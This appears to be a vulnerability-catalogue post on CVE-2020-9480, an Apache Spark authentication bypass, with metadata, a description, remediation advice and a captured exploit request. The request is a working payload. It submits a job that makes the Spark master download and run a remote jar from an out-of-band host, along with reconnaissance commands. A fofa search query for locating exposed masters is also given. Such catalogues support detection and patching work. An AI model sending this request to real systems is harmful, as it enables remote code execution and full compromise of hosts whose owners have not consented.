---
layout: post
cve_id: CVE-2020-9480
title: Apache Spark - Authentication Bypass
pcap: true
pcap_path: /pcaps/2020/CVE-2020-9480.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-9480.yaml
snort2_rule: N/A
snort3_rule: N/A
author: riteshs4hu
severity: critical
impact: 'Attackers can execute arbitrary shell commands on the host machine, leading
  to full system compromise.

  '
remediation: 'Update to Spark 2.4.6 or later to fix the vulnerability.

  '
reference:
- https://github.com/XiaoShaYu617/CVE-2020-9480/blob/main/20220624_apache_spark_apache_spark_pre-auth_code_execution_cve-2020-9480.py
- https://nvd.nist.gov/vuln/detail/cve-2020-9480
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2020-9480
  epss-score: 0.933
  epss-percentile: 0.99794
  cwe-id: CWE-306
metadata:
  verified: true
  max-request: 1
  vendor: apache
  product: spark
  fofa-query: port="6066" && banner="Spark Master"
tags:
- cve
- cve2020
- apache
- spark
- auth-bypass
- vkev
- vuln
---

## üîç Vulnerability Description
In Apache Spark 2.4.5 and earlier, a standalone resource manager's master may be configured to require authentication (spark.authenticate) via a shared secret. When enabled, however, a specially-crafted RPC to the master can succeed in starting an application's resources on the Spark cluster, even without the shared key. This can be leveraged to execute shell commands on the host machine. This does not affect Spark clusters using other resource managers (YARN, Mesos, etc).


## üåê HTTP Request
```nohighlight
POST /v1/submissions/create HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/619.23 (KHTML, like Gecko) Version/15.3.85 Safari/619.23
Connection: close
Content-Length: 652
Content-Type: application/json
Accept-Encoding: gzip
{
"action": "CreateSubmissionRequest",
"clientSparkVersion": "2.3.1",
"appArgs": ["whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"],
"appResource": "http://d5ivjf9le0o3eh17d36ggjfo4snqk7n9w.oast.me/MAqju.jar",
"environmentVariables": {"SPARK_ENV_LOADED":"1"},
"mainClass": "Exploit",
"sparkProperties": {
"spark.jars": "http://d5ivjf9le0o3eh17d36ggjfo4snqk7n9w.oast.me/MAqju.jar",
"spark.driver.supervise": "false",
"spark.app.name": "Exploit",
"spark.eventLog.enabled": "true",
"spark.submit.deployMode": "cluster",
"spark.master": "spark://www.victim.com:6066"
}
}
```

